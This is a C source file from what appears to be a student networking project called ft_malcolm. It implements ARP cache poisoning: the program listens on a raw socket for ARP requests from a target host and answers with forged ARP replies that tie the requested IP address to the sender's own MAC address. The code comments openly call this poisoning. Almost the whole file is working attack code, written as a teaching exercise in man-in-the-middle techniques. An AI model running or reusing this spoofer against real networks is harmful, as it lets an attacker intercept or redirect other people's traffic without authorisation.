/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   request.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: lagea < lagea@student.s19.be >             +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/07/08 16:16:15 by lagea             #+#    #+#             */
/*   Updated: 2025/07/11 15:48:00 by lagea            ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "../inc/ft_malcolm.h"

static void fill_mac_addr(char *mac_str, u_int8_t *mac)
{
	int values[6];
	for (int i = 0; i < 6; i++) {
		char byte_str[3] = {0};
		size_t pos = i * 3;
		if (mac_str[pos] == '\0' || mac_str[pos + 1] == '\0')
			exit_error("Invalid MAC address format");
		byte_str[0] = mac_str[pos];
		byte_str[1] = mac_str[pos + 1];
		int val = (int)ft_atoi_base(byte_str, "0123456789abcdef");
		values[i] = val;
		if (i < 5 && mac_str[pos + 2] != ':')
			exit_error("Invalid MAC address format");
	}
	for (int i = 0; i < 6; i++)
		mac[i] = (u_int8_t)values[i];
}

static void build_arp_packet(t_data *data, u_int32_t fakesenderip)
{
	printf("Fake sender IP: %s\n", inet_ntoa(*(struct in_addr *)&fakesenderip));
	t_arp_packet *packet = &data->packet;
	ft_memset(packet, 0, sizeof(t_arp_packet));

	// Fill Ethernet header - send to the target (destination)
	// ft_memcpy(packet->ethhdr.h_dest, data->destination.mac, ETH_ALEN);
	fill_mac_addr(data->destination.mac, packet->ethhdr.h_dest); // Destination MAC
	// ft_memcpy(packet->ethhdr.h_source, data->source.mac, ETH_ALEN);  // Our MAC
	fill_mac_addr(data->source.mac, packet->ethhdr.h_source);
	packet->ethhdr.h_proto = htons(ETH_P_ARP);

	// Fill ARP header
	packet->arphdr.htype = htons(1); // Ethernet
	packet->arphdr.ptype = htons(ETH_P_IP); // IPv4
	packet->arphdr.hlen = ETH_ALEN;
	packet->arphdr.plen = 4;
	packet->arphdr.oper = htons(2); // ARP reply

	// ARP Reply: "I am source.ip and my MAC is source.mac"
	// This tells destination that source.ip has source.mac (poisoning)
	// ft_memcpy(packet->arphdr.sha, data->source.mac, ETH_ALEN);     // Our MAC (sender)
	fill_mac_addr(data->source.mac, packet->arphdr.sha); // Our MAC (sender)
	ft_memcpy(packet->arphdr.spa, &fakesenderip, 4);           // Source IP (we claim to be)
	printf("Inserted fake sender IP: %s\n", inet_ntoa(*(struct in_addr *)packet->arphdr.spa));
	// ft_memcpy(packet->arphdr.tha, data->destination.mac, ETH_ALEN); // Target MAC
	fill_mac_addr(data->destination.mac, packet->arphdr.tha); // Target MAC
	ft_memcpy(packet->arphdr.tpa, &data->destination.iip, 4);       // Target IP
}

static void send_arp_reply(t_data *data, u_int32_t fakesenderip)
{
	struct sockaddr_ll addr;
	
	ft_memset(&addr, 0, sizeof(addr));
	addr.sll_family = AF_PACKET;
	addr.sll_ifindex = data->ifindex;
	addr.sll_protocol = htons(ETH_P_ARP);
	addr.sll_halen = ETH_ALEN;

	ft_memcpy(addr.sll_addr, data->destination.mac, ETH_ALEN);

	build_arp_packet(data, fakesenderip);
	
	// Debug: Print the packet we're about to send
	printf("Sending ARP Reply:\n");
	printf("  Ethernet: src %02x:%02x:%02x:%02x:%02x:%02x -> dst %02x:%02x:%02x:%02x:%02x:%02x\n",
		data->packet.ethhdr.h_source[0], data->packet.ethhdr.h_source[1], data->packet.ethhdr.h_source[2],
		data->packet.ethhdr.h_source[3], data->packet.ethhdr.h_source[4], data->packet.ethhdr.h_source[5],
		data->packet.ethhdr.h_dest[0], data->packet.ethhdr.h_dest[1], data->packet.ethhdr.h_dest[2],
		data->packet.ethhdr.h_dest[3], data->packet.ethhdr.h_dest[4], data->packet.ethhdr.h_dest[5]);
	
	// Store IP addresses in separate variables to avoid inet_ntoa() buffer conflicts
	char src_ip_str[INET_ADDRSTRLEN];
	char dst_ip_str[INET_ADDRSTRLEN];
	inet_ntop(AF_INET, data->packet.arphdr.spa, src_ip_str, INET_ADDRSTRLEN);
	inet_ntop(AF_INET, data->packet.arphdr.tpa, dst_ip_str, INET_ADDRSTRLEN);

	printf("  ARP: src %s [%02x:%02x:%02x:%02x:%02x:%02x] -> dest %s [%02x:%02x:%02x:%02x:%02x:%02x]\n",
		src_ip_str,
		data->packet.arphdr.sha[0], data->packet.arphdr.sha[1], data->packet.arphdr.sha[2],
		data->packet.arphdr.sha[3], data->packet.arphdr.sha[4], data->packet.arphdr.sha[5],
		dst_ip_str,
		data->packet.arphdr.tha[0], data->packet.arphdr.tha[1], data->packet.arphdr.tha[2],
		data->packet.arphdr.tha[3], data->packet.arphdr.tha[4], data->packet.arphdr.tha[5]);
	
	ssize_t bytes_sent = sendto(data->sockfd, &data->packet, sizeof(t_arp_packet), 0, (struct sockaddr *)&addr, sizeof(addr));
	if (bytes_sent < 0) {
		print_errno("sendto");
		return;
	}

	printf("ARP reply sent successfully. Bytes sent: %zd\n", bytes_sent);
}

static void process_arp_packet(t_data *data, const unsigned char *buffer)
{
	t_ethhdr *eth = (t_ethhdr *)buffer;
	t_arphdr_payload *arp = (t_arphdr_payload *)(buffer + sizeof(t_ethhdr));
	
	printf("ARP Protocol Type: %u\n", ntohs(arp->oper));
	printf("Ethernet Protocol Type: 0x%04x\n", ntohs(eth->h_proto));
	
	if (ntohs(arp->oper) == ARPOP_REQUEST) {
		printf("ARP Request intercepted:\n");
		
		// Extract sender IP and MAC
		u_int32_t sender_ip = *((u_int32_t *)arp->spa);
		u_int32_t target_ip = *((u_int32_t *)arp->tpa);
		
		printf("Sender MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
			arp->sha[0], arp->sha[1], arp->sha[2], arp->sha[3], arp->sha[4], arp->sha[5]);
		printf("Sender IP: %s\n", inet_ntoa(*(struct in_addr *)&sender_ip));
		printf("Target IP: %s\n", inet_ntoa(*(struct in_addr *)&target_ip));

		if (sender_ip == data->destination.iip){
			printf("ARP request for our target IP detected.\n");
			send_arp_reply(data, target_ip);
		}
	}
}

void listen_arp_request(t_data *data)
{
	printf("Listening for ARP requests...\n");
	
	unsigned char buffer[ETH_FRAME_LEN];
	struct sockaddr_ll addr;
	socklen_t addr_len = sizeof(addr);
	ssize_t bytes_received;

	while (true){
		bytes_received = recvfrom(data->sockfd, &buffer, sizeof(buffer), 0, (struct sockaddr *)&addr, &addr_len);
		if (bytes_received < 0){
			print_errno("recvfrom");
			continue;
		}

		if (addr.sll_ifindex != data->ifindex) {
			printf("Received packet on different interface (index: %u)\n", addr.sll_ifindex);
			continue;
		}

		printf("\nReceived ARP packet of size: %zd bytes\n", bytes_received);
		process_arp_packet(data, buffer);
	}
	printf("Finished listening for ARP requests.\n");
}